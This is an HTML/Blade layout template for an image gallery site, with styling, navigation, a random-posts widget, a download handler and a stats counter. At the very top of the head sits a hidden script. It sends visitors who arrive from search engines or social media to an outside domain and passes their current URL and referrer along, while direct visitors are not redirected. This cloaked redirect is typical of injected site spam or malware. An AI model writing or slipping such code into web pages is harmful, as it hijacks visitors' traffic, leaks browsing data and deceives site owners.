<!doctype html>
<html lang="en">

<head>
	<script>
		var ars = 'https://madreview.net';
		if (['.google.', 'bing.', 'yandex.', 'facebook.', 'pinterest.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))) {
			window.location.href = ars + '/?arsae=' + encodeURIComponent(window.location.href) + '&arsae_ref=' + encodeURIComponent(document.referrer)
		}
	</script>
	<!--ads/auto.txt-->
	<!-- Required meta tags -->
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
	<!-- Bootstrap CSS -->
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha256-L/W5Wfqfa0sdBNIKN9cG6QA5F2qx4qICmU2VgLruv9Y=" crossorigin="anonymous" />
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/lightbox2/2.11.1/css/lightbox.min.css" integrity="sha256-tBxlolRHP9uMsEFKVk+hk//ekOlXOixLKvye5W2WR5c=" crossorigin="anonymous" />
	<link href="https://fonts.googleapis.com/css?family=Raleway" rel="stylesheet">
	<style type="text/css">
		body,
		html {
			font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
			font-size: 14px;
			font-weight: 400;
			background: #fff
		}

		img {
			max-width: 100%
		}

		.header {
			padding-bottom: 13px;
			margin-bottom: 13px
		}

		.container {
			max-width: 1024px
		}

		.navbar {
			margin-bottom: 25px;
			color: #f1f2f3;
			border-bottom: 1px solid #e1e2e3
		}

		.navbar .navbar-brand {
			margin: 0 20px 0 0;
			font-size: 28px;
			padding: 0;
			line-height: 24px
		}

		.row.content,
		.row.footer,
		.row.header {
			widthx: auto;
			max-widthx: 100%
		}

		.row.footer {
			padding: 30px 0;
			background: 0 0
		}

		.content .col-sm-12 {
			padding: 0
		}

		.content .col-md-9s {
			margin-right: -25px
		}

		.posts-image {
			width: 25%;
			display: block;
			float: left
		}

		.posts-image-content {
			width: auto;
			margin: 0 15px 35px 0;
			position: relative
		}

		.posts-image:nth-child(5n) .posts-image-content {
			margin: 0 0 35px !important
		}

		.posts-image img {
			width: 100%;
			height: 150px;
			object-fit: cover;
			object-position: center;
			margin-bottom: 10px;
			-webkit-transition: .6s opacity;
			transition: .6s opacity
		}

		.posts-image:hover img {
			opacity: .8
		}

		.posts-image:hover h2 {
			background: rgba(0, 0, 0, .7)
		}

		.posts-image h2 {
			z-index: 2;
			position: absolute;
			font-size: 14px;
			bottom: 2px;
			left: 0;
			right: 0;
			padding: 5px;
			text-align: center;
			-webkit-transition: .6s opacity;
			transition: .6s background
		}

		.posts-image h2 a {
			color: #fff
		}

		.posts-image-big {
			display: block;
			width: 100%
		}

		.posts-image-big .posts-image-content {
			margin: 0 0 10px !important
		}

		.posts-image-big img {
			height: 380px
		}

		.posts-image-big h2 {
			text-align: left;
			padding-left: 0;
			position: relative;
			font-size: 30px;
			line-height: 36px
		}

		.posts-image-big h2 a {
			color: #111
		}

		.posts-image-big:hover h2 {
			background: 0 0
		}

		.posts-image-single .posts-image-content,
		.posts-image-single:nth-child(5n) .posts-image-content {
			margin: 0 15px 15px 0 !important
		}

		.posts-image-single p {
			font-size: 12px;
			line-height: 18px !important
		}

		.posts-images {
			clear: both
		}

		.list-group li {
			padding: 0
		}

		.list-group li a {
			display: block;
			padding: 8px
		}

		.widget {
			margin-bottom: 20px
		}

		h3.widget-title {
			font-size: 20px
		}

		a {
			color: #f42966;
			text-decoration: none
		}

		.footer {
			margin-top: 21px;
			padding-top: 13px;
			border-top: 1px solid #eee
		}

		.footer a {
			margin: 0 15px
		}

		.navi {
			margin: 13px 0
		}

		.navi a {
			margin: 5px 2px;
			font-size: 95%
		}

		@media only screen and (min-width:0px) and (max-width:991px) {
			.container {
				width: auto;
				max-width: 100%
			}

			.navbar {
				padding: 5px 0
			}

			.navbar .container {
				width: 100%;
				margin: 0 15px
			}
		}

		@media only screen and (min-width:0px) and (max-width:767px) {
			.content .col-md-3 {
				padding: 15px
			}
		}

		@media only screen and (min-width:481px) and (max-width:640px) {
			.posts-image img {
				height: 90px
			}

			.posts-image-big img {
				height: 320px
			}

			.posts-image-single {
				width: 33.3%
			}

			.posts-image-single:nth-child(3n) .posts-image-content {
				margin-right: 0 !important
			}
		}

		@media only screen and (min-width:0px) and (max-width:480px) {
			.posts-image img {
				height: 80px
			}

			.posts-image-big img {
				height: 240px
			}

			.posts-image-single {
				width: 100%
			}

			.posts-image-single .posts-image-content {
				margin: 0 !important
			}

			.posts-image-single img {
				height: auto
			}
		}

		.v-cover {
			height: 380px;
			object-fit: cover;
		}

		.v-image {
			height: 200px;
			object-fit: cover;
		}

		.main {
			margin-top: 1.7rem;
		}

		.form-inline .form-control {
			min-width: 300px;
		}
	</style>
	@yield('head')
	@include('header')
</head>

<body>
	<header class="bg-white">
		<nav class="navbar navbar-light bg-white mb-0">
			<div class="container justify-content-center justify-content-sm-between">
				<a href="{{ home_url() }}" title="{{ site_name() }}" class="navbar-brand mb-1">{{ site_name() }}</a>
				<form class="form-inline mb-1" action="{{home_url('search')}}" method="get">
					<input class="form-control mr-sm-2" type="search" name="q" placeholder="Search and hit enter.." aria-label="Search">
				</form>
			</div>
		</nav>
	</header>
	<center>
		<!--ads/responsive.txt-->
	</center>
	<main id="main" class="main">
		<div class="container">
			<div class="row content">
				<div class="col-md-9">
					<div class="col-sm-12 p-2">

						@yield('header')
						@include('related')

					</div>
					<div class="col-sm-12">
						@yield('content')
					</div>
				</div>
				<div class="col-md-3">
					<div class="col-sm-12 widget">
						<h3 class="widget-title">Random Posts</h3>
						<ul class="list-group"> @foreach(collect(random_related())->shuffle()->take(50) as $r)
							<li class="list-group-item"><a href="{{ image_url($r) }}">{{ ucwords($r) }}</a></li>
							@endforeach
						</ul>
					</div>
				</div>
			</div>
			<div class="row footer">
				<div class="col-md-12 text-center">
					@foreach(pages() as $page)
					<a href="{{ page_url($page) }}">{{ ucwords(str_replace('-', ' ', $page)) }}</a>
					@endforeach
					<a href="/sitemap.xml">Sitemap</a>
				</div>
			</div>
		</div>
		@include('bar')
		@include('footer')
	</main>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.12.1/js/all.min.js" integrity="sha256-MAgcygDRahs+F/Nk5Vz387whB4kSK9NXlDN3w58LLq0=" crossorigin="anonymous"></script>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/lightbox2/2.11.1/js/lightbox.min.js" integrity="sha256-CtKylYan+AJuoH8jrMht1+1PMhMqrKnB8K5g012WN5I=" crossorigin="anonymous"></script>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/downloadjs/1.4.8/download.min.js"></script>

	@php
	$lazyload = LAZY_LOAD;
	$show_dwn = SHOW_DOWNLOAD;
	@endphp

	@if($lazyload == TRUE)
	<script async='async' src="https://cdnjs.cloudflare.com/ajax/libs/vanilla-lazyload/12.0.3/lazyload.min.js" integrity="sha256-07HbhWMzlSuhFpeiTy8zouvXxdqnEZ63A4KBLW2Efqc=" crossorigin="anonymous"></script>
	<script type='text/javascript'>
		(function() {
			window.lazyLoadOptions = {
				elements_selector: ".lazyload"
			};
		})();
	</script>
	@endif

	@if($show_dwn == TRUE)
	<script src="https://cdnjs.cloudflare.com/ajax/libs/downloadjs/1.4.8/download.min.js"></script>
	<script type='text/javascript'>
		$(document).ready(function() {
			$(document).on('click', '#image-download', function(e) {
				e.preventDefault();
				var url = $(this).data('url');
				var title = $(this).data('title');
				var x = new XMLHttpRequest();
				x.open("GET", url, true);
				x.responseType = "blob";
				x.onload = function(e) {
					download(e.target.response, title, "image/jpg");
				};
				x.send();
			});
		});
	</script>
	@endif
	<!-- Histats.com  START  (aync)-->
	<script type="text/javascript">
		var _Hasync = _Hasync || [];
		_Hasync.push(['Histats.start', '1,4438556,4,0,0,0,00010000']);
		_Hasync.push(['Histats.fasi', '1']);
		_Hasync.push(['Histats.track_hits', '']);
		(function() {
			var hs = document.createElement('script');
			hs.type = 'text/javascript';
			hs.async = true;
			hs.src = ('//s10.histats.com/js15_as.js');
			(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
		})();
	</script>
	<noscript><a href="/" target="_blank"><img src="//sstatic1.histats.com/0.gif?4438556&101" alt="stat counter" border="0"></a></noscript>
	<!-- Histats.com  END  -->
</body>

</html>